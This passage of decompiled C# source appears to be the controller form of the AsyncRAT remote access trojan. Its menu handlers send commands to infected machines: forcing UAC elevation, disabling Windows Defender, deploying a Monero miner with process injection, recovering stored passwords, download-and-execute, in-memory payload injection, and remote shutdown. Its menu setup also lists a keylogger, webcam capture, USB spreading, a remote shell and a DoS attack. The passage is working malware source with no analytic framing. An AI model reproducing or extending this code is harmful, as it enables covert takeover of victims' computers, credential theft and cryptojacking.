          ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
        }
      }
    }

    private void VisitWebsiteToolStripMenuItem1_Click(object sender, EventArgs e)
    {
      try
      {
        string str = Interaction.InputBox("VISIT WEBSITE", "URL", "https://www.google.com");
        if (string.IsNullOrEmpty(str))
          return;
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Packet").AsString = "visitURL";
        msgPack1.ForcePathObject("URL").AsString = str;
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Packet").AsString = "plugin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        foreach (Clients selectedClient in this.GetSelectedClients())
          ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void SendMessageBoxToolStripMenuItem1_Click(object sender, EventArgs e)
    {
      try
      {
        string str = Interaction.InputBox("Message", "Message", "Hello World!");
        if (string.IsNullOrEmpty(str))
          return;
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Packet").AsString = "sendMessage";
        msgPack1.ForcePathObject("Message").AsString = str;
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Packet").AsString = "plugin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        foreach (Clients selectedClient in this.GetSelectedClients())
          ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void ChatToolStripMenuItem1_Click(object sender, EventArgs e)
    {
      try
      {
        foreach (Clients selectedClient in this.GetSelectedClients())
        {
          if ((FormChat) Application.OpenForms["chat:" + selectedClient.ID] == null)
          {
            FormChat formChat = new FormChat();
            formChat.Name = "chat:" + selectedClient.ID;
            formChat.Text = "chat:" + selectedClient.ID;
            formChat.F = this;
            formChat.ParentClient = selectedClient;
            formChat.Show();
          }
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void GetAdminPrivilegesToolStripMenuItem_Click_1(object sender, EventArgs e)
    {
      if (this.listView1.SelectedItems.Count <= 0)
        return;
      if (MessageBox.Show((IWin32Window) this, "Popup UAC prompt? ", "AsyncRAT | UAC", MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) != DialogResult.Yes)
        return;
      try
      {
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Packet").AsString = "uac";
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Packet").AsString = "plugin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        foreach (Clients selectedClient in this.GetSelectedClients())
        {
          if (selectedClient.LV.SubItems[this.lv_admin.Index].Text != "Administrator")
            ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void DisableWindowsDefenderToolStripMenuItem_Click_1(object sender, EventArgs e)
    {
      if (this.listView1.SelectedItems.Count <= 0)
        return;
      if (MessageBox.Show((IWin32Window) this, "Will only execute on clients with administrator privileges!", "AsyncRAT | Disbale Defender", MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) != DialogResult.Yes)
        return;
      try
      {
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Packet").AsString = "disableDefedner";
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Packet").AsString = "plugin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        foreach (Clients selectedClient in this.GetSelectedClients())
        {
          if (selectedClient.LV.SubItems[this.lv_admin.Index].Text == "Admin")
            ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void RunToolStripMenuItem2_Click(object sender, EventArgs e)
    {
      try
      {
        if (this.listView1.SelectedItems.Count <= 0)
          return;
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Packet").AsString = "blankscreen+";
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Packet").AsString = "plugin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        foreach (Clients selectedClient in this.GetSelectedClients())
          ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void StopToolStripMenuItem1_Click(object sender, EventArgs e)
    {
      try
      {
        if (this.listView1.SelectedItems.Count <= 0)
          return;
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Packet").AsString = "blankscreen-";
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Packet").AsString = "plugin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        foreach (Clients selectedClient in this.GetSelectedClients())
          ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void setWallpaperToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        if (this.listView1.SelectedItems.Count <= 0)
          return;
        using (OpenFileDialog openFileDialog = new OpenFileDialog())
        {
          openFileDialog.Filter = "All Graphics Types|*.bmp;*.jpg;*.jpeg;*.png";
          if (openFileDialog.ShowDialog() != DialogResult.OK)
            return;
          MsgPack msgPack1 = new MsgPack();
          msgPack1.ForcePathObject("Packet").AsString = "wallpaper";
          msgPack1.ForcePathObject("Image").SetAsBytes(File.ReadAllBytes(openFileDialog.FileName));
          msgPack1.ForcePathObject("Exe").AsString = Path.GetExtension(openFileDialog.FileName);
          MsgPack msgPack2 = new MsgPack();
          msgPack2.ForcePathObject("Packet").AsString = "plugin";
          msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
          msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
          foreach (Clients selectedClient in this.GetSelectedClients())
            ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void CloseToolStripMenuItem1_Click(object sender, EventArgs e)
    {
      try
      {
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Packet").AsString = "close";
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Packet").AsString = "plugin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        foreach (Clients selectedClient in this.GetSelectedClients())
          ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void RestartToolStripMenuItem2_Click(object sender, EventArgs e)
    {
      try
      {
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Packet").AsString = "restart";
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Packet").AsString = "plugin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        foreach (Clients selectedClient in this.GetSelectedClients())
          ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void UpdateToolStripMenuItem2_Click(object sender, EventArgs e)
    {
      try
      {
        using (OpenFileDialog openFileDialog = new OpenFileDialog())
        {
          if (openFileDialog.ShowDialog() != DialogResult.OK)
            return;
          MsgPack msgPack1 = new MsgPack();
          msgPack1.ForcePathObject("Packet").AsString = "sendFile";
          msgPack1.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
          msgPack1.ForcePathObject("Extension").AsString = Path.GetExtension(openFileDialog.FileName);
          msgPack1.ForcePathObject("Update").AsString = "true";
          MsgPack msgPack2 = new MsgPack();
          msgPack2.ForcePathObject("Packet").AsString = "plugin";
          msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
          msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
          foreach (Clients selectedClient in this.GetSelectedClients())
          {
            selectedClient.LV.ForeColor = Color.Red;
            ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
          }
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void UninstallToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (MessageBox.Show((IWin32Window) this, "Are you sure you want to unistall", "AsyncRAT | Unistall", MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) != DialogResult.Yes)
        return;
      try
      {
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Packet").AsString = "uninstall";
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Packet").AsString = "plugin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        foreach (Clients selectedClient in this.GetSelectedClients())
          ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void ShowFolderToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        Clients[] selectedClients = this.GetSelectedClients();
        if (selectedClients.Length == 0)
        {
          Process.Start(Application.StartupPath);
        }
        else
        {
          foreach (Clients clients in selectedClients)
          {
            string str = Path.Combine(Application.StartupPath, "ClientsFolder\\" + clients.ID);
            if (Directory.Exists(str))
              Process.Start(str);
          }
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void RestartToolStripMenuItem3_Click(object sender, EventArgs e)
    {
      try
      {
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Packet").AsString = "pcOptions";
        msgPack1.ForcePathObject("Option").AsString = "restart";
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Packet").AsString = "plugin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        foreach (Clients selectedClient in this.GetSelectedClients())
          ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void ShutdownToolStripMenuItem1_Click(object sender, EventArgs e)
    {
      try
      {
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Packet").AsString = "pcOptions";
        msgPack1.ForcePathObject("Option").AsString = "shutdown";
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Packet").AsString = "plugin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        foreach (Clients selectedClient in this.GetSelectedClients())
          ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void LogoffToolStripMenuItem1_Click(object sender, EventArgs e)
    {
      try
      {
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Packet").AsString = "pcOptions";
        msgPack1.ForcePathObject("Option").AsString = "logoff";
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Packet").AsString = "plugin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        foreach (Clients selectedClient in this.GetSelectedClients())
          ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void bUILDERToolStripMenuItem_Click(object sender, EventArgs e)
    {
      using (FormBuilder formBuilder = new FormBuilder())
      {
        int num = (int) formBuilder.ShowDialog();
      }
    }

    private void ABOUTToolStripMenuItem_Click(object sender, EventArgs e)
    {
      using (FormAbout formAbout = new FormAbout())
      {
        int num = (int) formAbout.ShowDialog();
      }
    }

    private void CLEARToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        lock (Settings.LockListviewLogs)
          this.listView2.Items.Clear();
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void STARTToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (this.listView1.Items.Count <= 0)
        return;
      MsgPack msgPack1 = new MsgPack();
      msgPack1.ForcePathObject("Packet").AsString = "thumbnails";
      MsgPack msgPack2 = new MsgPack();
      msgPack2.ForcePathObject("Packet").AsString = "plugin";
      msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
      msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
      foreach (Clients allClient in this.GetAllClients())
        ThreadPool.QueueUserWorkItem(new WaitCallback(allClient.Send), (object) msgPack2.Encode2Bytes());
    }

    private void STOPToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        if (this.listView1.Items.Count > 0)
        {
          MsgPack msgPack = new MsgPack();
          msgPack.ForcePathObject("Packet").AsString = "thumbnailsStop";
          foreach (ListViewItem listViewItem in this.listView3.Items)
            ThreadPool.QueueUserWorkItem(new WaitCallback(((Clients) listViewItem.Tag).Send), (object) msgPack.Encode2Bytes());
        }
        this.listView3.Items.Clear();
        this.ThumbnailImageList.Images.Clear();
        foreach (ListViewItem listViewItem in this.listView1.Items)
          ((Clients) listViewItem.Tag).LV2 = (ListViewItem) null;
      }
      catch
      {
      }
    }

    private void DELETETASKToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (this.listView4.SelectedItems.Count <= 0)
        return;
      foreach (ListViewItem selectedItem in this.listView4.SelectedItems)
        selectedItem.Remove();
    }

    private async void TimerTask_Tick(object sender, EventArgs e)
    {
      try
      {
        Clients[] clients = this.GetAllClients();
        if (this.getTasks.Count > 0 && clients.Length != 0)
        {
          foreach (AsyncTask asyncTask in this.getTasks.ToList<AsyncTask>())
          {
            if (!this.GetListview(asyncTask.id))
            {
              this.getTasks.Remove(asyncTask);
              return;
            }
            foreach (Clients clients1 in clients)
            {
              if (!asyncTask.doneClient.Contains(clients1.ID))
              {
                asyncTask.doneClient.Add(clients1.ID);
                this.SetExecution(asyncTask.id);
                ThreadPool.QueueUserWorkItem(new WaitCallback(clients1.Send), (object) asyncTask.msgPack);
              }
            }
            await Task.Delay(15000);
          }
        }
        clients = (Clients[]) null;
      }
      catch
      {
      }
    }

    private void MinerToolStripMenuItem1_Click(object sender, EventArgs e)
    {
      try
      {
        if (this.listView4.Items.Count > 0)
        {
          foreach (ListViewItem listViewItem in this.listView4.Items)
          {
            if (listViewItem.Text == "Miner XMR")
              return;
          }
        }
        using (FormMiner formMiner = new FormMiner())
        {
          if (formMiner.ShowDialog() != DialogResult.OK)
            return;
          if (!File.Exists("Plugins\\xmrig.bin"))
            File.WriteAllBytes("Plugins\\xmrig.bin", Resources.xmrig);
          MsgPack msgPack1 = new MsgPack();
          msgPack1.ForcePathObject("Packet").AsString = "xmr";
          msgPack1.ForcePathObject("Command").AsString = "run";
          XmrSettings.Pool = formMiner.txtPool.Text;
          msgPack1.ForcePathObject("Pool").AsString = formMiner.txtPool.Text;
          XmrSettings.Wallet = formMiner.txtWallet.Text;
          msgPack1.ForcePathObject("Wallet").AsString = formMiner.txtWallet.Text;
          XmrSettings.Pass = formMiner.txtPass.Text;
          msgPack1.ForcePathObject("Pass").AsString = formMiner.txtPool.Text;
          XmrSettings.InjectTo = formMiner.comboInjection.Text;
          msgPack1.ForcePathObject("InjectTo").AsString = formMiner.comboInjection.Text;
          XmrSettings.Hash = GetHash.GetChecksum("Plugins\\xmrig.bin");
          msgPack1.ForcePathObject("Hash").AsString = XmrSettings.Hash;
          MsgPack msgPack2 = new MsgPack();
          msgPack2.ForcePathObject("Packet").AsString = "plugin";
          msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
          msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
          ListViewItem listViewItem = new ListViewItem();
          listViewItem.Text = "Miner XMR";
          listViewItem.SubItems.Add("0");
          listViewItem.ToolTipText = Guid.NewGuid().ToString();
          this.listView4.Items.Add(listViewItem);
          this.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
          this.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText));
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void PASSWORDRECOVERYToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        if (this.listView4.Items.Count > 0)
        {
          foreach (ListViewItem listViewItem in this.listView4.Items)
          {
            if (listViewItem.Text == "Recovery Password")
              return;
          }
        }
        MsgPack msgPack = new MsgPack();
        msgPack.ForcePathObject("Packet").AsString = "plugin";
        msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Recovery.dll");
        ListViewItem listViewItem1 = new ListViewItem();
        listViewItem1.Text = "Recovery Password";
        listViewItem1.SubItems.Add("0");
        listViewItem1.ToolTipText = Guid.NewGuid().ToString();
        this.listView4.Items.Add(listViewItem1);
        this.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
        this.getTasks.Add(new AsyncTask(msgPack.Encode2Bytes(), listViewItem1.ToolTipText));
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void DownloadAndExecuteToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        OpenFileDialog openFileDialog = new OpenFileDialog();
        if (openFileDialog.ShowDialog() != DialogResult.OK)
          return;
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Packet").AsString = "sendFile";
        msgPack1.ForcePathObject("Update").AsString = "false";
        msgPack1.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
        msgPack1.ForcePathObject("Extension").AsString = Path.GetExtension(openFileDialog.FileName);
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Packet").AsString = "plugin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        ListViewItem listViewItem1 = new ListViewItem();
        listViewItem1.Text = "SendFile: " + Path.GetFileName(openFileDialog.FileName);
        listViewItem1.SubItems.Add("0");
        listViewItem1.ToolTipText = Guid.NewGuid().ToString();
        if (this.listView4.Items.Count > 0)
        {
          foreach (ListViewItem listViewItem2 in this.listView4.Items)
          {
            if (listViewItem2.Text == listViewItem1.Text)
              return;
          }
        }
        Program.form1.listView4.Items.Add(listViewItem1);
        Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
        this.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem1.ToolTipText));
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void SENDFILETOMEMORYToolStripMenuItem1_Click(object sender, EventArgs e)
    {
      try
      {
        FormSendFileToMemory sendFileToMemory = new FormSendFileToMemory();
        int num = (int) sendFileToMemory.ShowDialog();
        if (sendFileToMemory.toolStripStatusLabel1.Text.Length > 0 && sendFileToMemory.toolStripStatusLabel1.ForeColor == Color.Green)
        {
          MsgPack msgPack1 = new MsgPack();
          msgPack1.ForcePathObject("Packet").AsString = "sendMemory";
          msgPack1.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(sendFileToMemory.toolStripStatusLabel1.Tag.ToString())));
          msgPack1.ForcePathObject("Inject").AsString = sendFileToMemory.comboBox1.SelectedIndex != 0 ? sendFileToMemory.comboBox2.Text : "";
          ListViewItem listViewItem1 = new ListViewItem();
          listViewItem1.Text = "SendMemory: " + Path.GetFileName(sendFileToMemory.toolStripStatusLabel1.Tag.ToString());
          listViewItem1.SubItems.Add("0");
          listViewItem1.ToolTipText = Guid.NewGuid().ToString();
          MsgPack msgPack2 = new MsgPack();
          msgPack2.ForcePathObject("Packet").AsString = "plugin";
          msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
          msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
          if (this.listView4.Items.Count > 0)
          {
            foreach (ListViewItem listViewItem2 in this.listView4.Items)
            {
              if (listViewItem2.Text == listViewItem1.Text)
                return;
            }
          }
          Program.form1.listView4.Items.Add(listViewItem1);
          Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
          this.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem1.ToolTipText));
        }
        sendFileToMemory.Close();
        sendFileToMemory.Dispose();
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void UPDATEToolStripMenuItem1_Click(object sender, EventArgs e)
    {
      try
      {
        OpenFileDialog openFileDialog = new OpenFileDialog();
        if (openFileDialog.ShowDialog() != DialogResult.OK)
          return;
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Packet").AsString = "sendFile";
        msgPack1.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
        msgPack1.ForcePathObject("Extension").AsString = Path.GetExtension(openFileDialog.FileName);
        msgPack1.ForcePathObject("Update").AsString = "true";
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Packet").AsString = "plugin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        ListViewItem listViewItem1 = new ListViewItem();
        listViewItem1.Text = "Update: " + Path.GetFileName(openFileDialog.FileName);
        listViewItem1.SubItems.Add("0");
        listViewItem1.ToolTipText = Guid.NewGuid().ToString();
        if (this.listView4.Items.Count > 0)
        {
          foreach (ListViewItem listViewItem2 in this.listView4.Items)
          {
            if (listViewItem2.Text == listViewItem1.Text)
              return;
          }
        }
        Program.form1.listView4.Items.Add(listViewItem1);
        Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
        this.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem1.ToolTipText));
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private bool GetListview(string id)
    {
      foreach (ListViewItem listViewItem in Program.form1.listView4.Items)
      {
        if (listViewItem.ToolTipText == id)
          return true;
      }
      return false;
    }

    private void SetExecution(string id)
    {
      foreach (ListViewItem listViewItem in Program.form1.listView4.Items)
      {
        if (listViewItem.ToolTipText == id)
        {
          int int32 = Convert.ToInt32(listViewItem.SubItems[1].Text);
          ++int32;
          listViewItem.SubItems[1].Text = int32.ToString();
        }
      }
    }

    private void BlockClientsToolStripMenuItem_Click(object sender, EventArgs e)
    {
      using (FormBlockClients formBlockClients = new FormBlockClients())
      {
        int num = (int) formBlockClients.ShowDialog();
      }
    }

    [DllImport("uxtheme", CharSet = CharSet.Unicode)]
    public static extern int SetWindowTheme(
      IntPtr hWnd,
      string textSubAppName,
      string textSubIdList);

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Form1));
      this.listView1 = new ListView();
      this.lv_ip = new ColumnHeader();
      this.lv_country = new ColumnHeader();
      this.lv_group = new ColumnHeader();
      this.lv_hwid = new ColumnHeader();
      this.lv_user = new ColumnHeader();
      this.lv_os = new ColumnHeader();
      this.lv_version = new ColumnHeader();
      this.lv_ins = new ColumnHeader();
      this.lv_admin = new ColumnHeader();
      this.lv_av = new ColumnHeader();
      this.lv_ping = new ColumnHeader();
      this.lv_act = new ColumnHeader();
      this.contextMenuClient = new ContextMenuStrip(this.components);
      this.aBOUTToolStripMenuItem = new ToolStripMenuItem();
      this.toolStripSeparator2 = new ToolStripSeparator();
      this.sENDFILEToolStripMenuItem = new ToolStripMenuItem();
      this.tOMEMORYToolStripMenuItem = new ToolStripMenuItem();
      this.tODISKToolStripMenuItem = new ToolStripMenuItem();
      this.monitoringToolStripMenuItem = new ToolStripMenuItem();
      this.remoteDesktopToolStripMenuItem1 = new ToolStripMenuItem();
      this.keyloggerToolStripMenuItem1 = new ToolStripMenuItem();
      this.passwordRecoveryToolStripMenuItem1 = new ToolStripMenuItem();
      this.fileManagerToolStripMenuItem1 = new ToolStripMenuItem();
      this.processManagerToolStripMenuItem1 = new ToolStripMenuItem();
      this.reportWindowToolStripMenuItem = new ToolStripMenuItem();
      this.runToolStripMenuItem1 = new ToolStripMenuItem();
      this.stopToolStripMenuItem2 = new ToolStripMenuItem();
      this.webcamToolStripMenuItem = new ToolStripMenuItem();
      this.miscellaneousToolStripMenuItem = new ToolStripMenuItem();
      this.botsKillerToolStripMenuItem = new ToolStripMenuItem();
      this.uSBSpreadToolStripMenuItem1 = new ToolStripMenuItem();
      this.seedTorrentToolStripMenuItem1 = new ToolStripMenuItem();
      this.remoteShellToolStripMenuItem1 = new ToolStripMenuItem();
      this.dOSAttackToolStripMenuItem = new ToolStripMenuItem();
      this.executeNETCodeToolStripMenuItem = new ToolStripMenuItem();
      this.xMRMinerToolStripMenuItem = new ToolStripMenuItem();
      this.runToolStripMenuItem = new ToolStripMenuItem();
      this.killToolStripMenuItem = new ToolStripMenuItem();
      this.filesSearcherToolStripMenuItem = new ToolStripMenuItem();
      this.extraToolStripMenuItem = new ToolStripMenuItem();
      this.visitWebsiteToolStripMenuItem1 = new ToolStripMenuItem();
      this.sendMessageBoxToolStripMenuItem1 = new ToolStripMenuItem();
      this.chatToolStripMenuItem1 = new ToolStripMenuItem();
      this.getAdminPrivilegesToolStripMenuItem = new ToolStripMenuItem();
      this.blankScreenToolStripMenuItem = new ToolStripMenuItem();
      this.runToolStripMenuItem2 = new ToolStripMenuItem();
      this.stopToolStripMenuItem1 = new ToolStripMenuItem();
      this.disableWindowsDefenderToolStripMenuItem = new ToolStripMenuItem();
      this.setWallpaperToolStripMenuItem = new ToolStripMenuItem();
      this.systemToolStripMenuItem = new ToolStripMenuItem();
      this.pCToolStripMenuItem = new ToolStripMenuItem();
      this.toolStripSeparator1 = new ToolStripSeparator();
      this.serverToolStripMenuItem = new ToolStripMenuItem();
      this.blockClientsToolStripMenuItem = new ToolStripMenuItem();
      this.toolStripSeparator5 = new ToolStripSeparator();
      this.bUILDERToolStripMenuItem = new ToolStripMenuItem();
      this.statusStrip1 = new StatusStrip();
      this.toolStripStatusLabel2 = new ToolStripStatusLabel();
      this.toolStripStatusLabel1 = new ToolStripStatusLabel();
      this.ping = new System.Windows.Forms.Timer(this.components);
      this.UpdateUI = new System.Windows.Forms.Timer(this.components);
      this.tabControl1 = new TabControl();
      this.tabPage1 = new TabPage();
      this.tabPage2 = new TabPage();
      this.listView2 = new ListView();
      this.columnHeader1 = new ColumnHeader();
      this.columnHeader2 = new ColumnHeader();
      this.contextMenuLogs = new ContextMenuStrip(this.components);
      this.cLEARToolStripMenuItem = new ToolStripMenuItem();
      this.tabPage3 = new TabPage();
      this.listView3 = new ListView();
      this.contextMenuThumbnail = new ContextMenuStrip(this.components);
      this.sTARTToolStripMenuItem = new ToolStripMenuItem();
      this.sTOPToolStripMenuItem = new ToolStripMenuItem();
      this.ThumbnailImageList = new ImageList(this.components);
      this.tabPage4 = new TabPage();
      this.listView4 = new ListView();
      this.columnHeader4 = new ColumnHeader();
